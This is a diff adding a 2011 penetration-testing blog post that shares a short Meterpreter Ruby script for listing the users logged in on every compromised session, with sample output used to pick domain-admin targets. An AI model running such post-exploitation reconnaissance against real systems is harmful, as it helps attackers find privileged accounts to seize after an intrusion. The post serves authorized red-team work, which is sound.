@@ -1,0 +1,50 @@
+---
+author: mubix
+comments: true
+date: 2011-09-17 02:37:31+00:00
+layout: post
+title: Who Is Logged In? A Quick Way To Pick Your Targets
+categories:
+- meterpreter
+---
+
+Say you go for the 500+ shells on an internal test or your phishing exersice goes way better than you thought. Well you need to get your bearings quickly and going into each shell and doing a ps, then looking through the list for all the users logged in is a bit of a pain and defintely not ideal.
+
+I wrote a quick script that you can throw in the meterpreter scripts folder to aide you a bit with this:
+
+```ruby    
+users = []
+client.sys.process.each_process do |x|
+        users << x["user"]
+end
+
+users.sort!
+users.uniq!
+users.delete_if {|x| x =~ /^NT AUTHORITY/}
+users.delete_if {|x| x == ""}
+loggedin = users.join(', ')
+print_status(loggedin)
+```
+
+All it does is automate the process I said above, used in concert with the 'sessions -s' command makes life a bit easier:
+
+```    
+msf  post(enum_logged_on) > sessions -s loggedin
+[*] Running script loggedin on all sessions...
+[*] Session 1 (victimgatewayaddress:21638):
+[*] DOMAIN\User1
+[*] Session 2 (victimgatewayaddress:39900):
+[*] DOMAIN\AdminUser1
+[*] Session 3 (victimgatewayaddress:59395):
+[*] DOMAIN\User5
+[*] Session 5 (victimgatewayaddress:21639):
+[*] DOMAIN\User20
+[*] Session 6 (victimgatewayaddress:21640):
+[*] COMPUTERNAME\Administrator, DOMAIN2\AdminUser7
+[*] Session 7 (victimgatewayaddress:39901):
+[*] DOMAIN\User55
+```    
+
+You can see from this output I probably want to start with session 2, and probably 6 as well as it seems to be on another domain and an admin to boot. The example is small but on a larger scale this can start to be much more important for time management. I'm sure there are some of you out there that realized after spending hours with another session that you had one with a DA signed into it on a different system.
+
+Just a disclaimer, this ONLY shows who is logged into the sessions you have, not remote systems.
